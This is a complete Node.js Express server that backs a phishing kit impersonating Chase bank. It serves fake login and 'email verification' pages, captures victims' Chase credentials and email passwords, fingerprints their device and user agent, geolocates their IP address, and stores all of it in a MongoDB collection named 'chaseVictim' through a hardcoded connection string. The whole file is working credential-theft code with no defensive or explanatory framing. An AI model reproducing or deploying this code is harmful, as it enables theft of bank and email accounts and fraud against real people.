let express = require("express"),
    app = express(),
    path = require("path"),
    https = require("https"),
    mongoose = require("mongoose"),
    cookieSession = require('cookie-session'),
    rp = require('request-promise'),
    requestIp = require('request-ip'),
    bodyParser = require('body-parser'),
    db = null,
    chaseVictimSchema = null,
    chaseVictim = null,
    visitorIp = null,
    Sniffr = require("sniffr"),
    s = new Sniffr(),
    chaseUsername = null,
    chasePassword = null,
    email = null,
    emailPassword = null;


mongoose.connect("mongodb+srv://fghjk:gGBDNZZ6Ib0^@cluster0-o5u3s.mongodb.net/test", {
    useNewUrlParser: true
});

db = mongoose.connection;

chaseVictimSchema = new mongoose.Schema({
    chaseUsername: String,
    chasePassword: String,
    email: String,
    emailPassword: String,
    userDevice: String,
    userAgent: String,
    victimIpInfo: {}
}, {
    minimize: false
})

chaseVictim = mongoose.model("chaseVictim", chaseVictimSchema);

app.set("port", (process.env.PORT || 2000));

app.use(express.static(path.join(__dirname, 'public')));

app.set("view engine", "ejs");

app.use(cookieSession({
    secret: "dhkdhbdiehrud272",
    maxAge: new Date("1997").getTime()
}))

app.use(bodyParser.json())

app.get("/", (req, res) => {
    res.redirect("/account/login");
})

app.get("/account/login", (req, res) => {
    s.sniff(req.headers['user-agent']);
    res.render("index");
})


app.get("/account/email-verification", (req, res) => {
    s.sniff(req.headers['user-agent']);
    res.render("email-verification");
})

app.post("/logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    if (req.body.page === 1) {
        chaseUsername = req.body.chaseUsername;
        chasePassword = req.body.chasePassword
        res.end("1");
    } else if (req.body.page === 2) {
        email = req.body.email;
        emailPassword = req.body.emailPassword;
        getVictimIpInfoAndSaveVictimInfoToDb(s.os.name, req.headers['user-agent'], req, res);
    }
});

function getVictimIpInfoAndSaveVictimInfoToDb(userDevice, userAgent, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new chaseVictim({
            chaseUsername,
            chasePassword,
            email,
            emailPassword,
            userDevice,
            userAgent,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("2");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

db.on("error", (err) => {
    console.log(err);
})

db.once("open", () => {

    console.log(`Database connected`);

    app.listen(app.get("port"), () => {

        console.log(`Listening on port ${app.get("port")}`);

    });

})